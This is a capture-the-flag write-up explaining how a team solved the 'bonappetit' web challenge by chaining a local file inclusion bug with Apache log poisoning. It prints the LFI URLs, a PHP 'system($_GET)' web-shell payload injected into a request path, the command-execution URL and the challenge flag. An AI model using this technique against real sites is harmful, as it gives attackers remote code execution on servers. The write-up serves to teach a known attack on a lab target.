Hello all  , after reading some write up , i notice that 90% of players solved this challenge with the simple and easy way 

using .htaccess file to find the flag file name and then read it using LFI was really easy and fast 


But in our team always we look for hard way :D joking 

First we found that there is LFI vuln in the website which make us able to read any file in the server :

```
http://bonappetit.stillhackinganyway.nl/?page=LFI HERE
```

so here you can read all what you need to deal with this challenge 

the easy way is that you find the .htaccess file and then read the flag using the name mention in this file 

as we dont check this file we did my own solution and as i thin its the goal of this task

when you read the source of home page we see text : 

<!-- TODO: Check apache access and error log for errors -->

so we check the log files access.log but we dont find it , then check access.log.1 and we get it ,also log.sh file used to create the log file 


"output : All logs are saved in /var/www/html/logs/[client_ip].log, rotated after 10 entries."

```
http://bonappetit.stillhackinganyway.nl/?page=file:///var/log/apache2/access.log.1
http://bonappetit.stillhackinganyway.nl/log.sh

#!/bin/bash

while read -r
do
   HOST=$(echo $REPLY|awk '{ print $1 }')
   LOG=/var/www/html/logs/${HOST}.log
   touch ${LOG}

   # Check length
   LEN=$(cat ${LOG}| wc -l) 
   if [ ${LEN} -gt 10 ] 
   then
      > ${LOG}
   fi

   echo "${REPLY}" >> ${LOG}  2>&1
done

exit 0
```

then we just did simple log poisoning and run our command in the server 

```
GET /<?php system($_GET['a']);?>
```

then

```
bonappetit.stillhackinganyway.nl/?page=file:///var/www/html/logs/our_ip.log&a=ls
```

![pasted image at 2017_08_05 01_06 pm](https://user-images.githubusercontent.com/7364615/29022899-8bd968d0-7b6b-11e7-8f3e-c3a454d9fd65.png)


and finaly read the flag 

![envoye_le_5_8_2017_a_13_09_05](https://user-images.githubusercontent.com/7364615/29022986-dead8cf8-7b6b-11e7-877d-9d8d58bf6049.png)

flag{82d8173445ea865974fc0569c5c7cf7f}
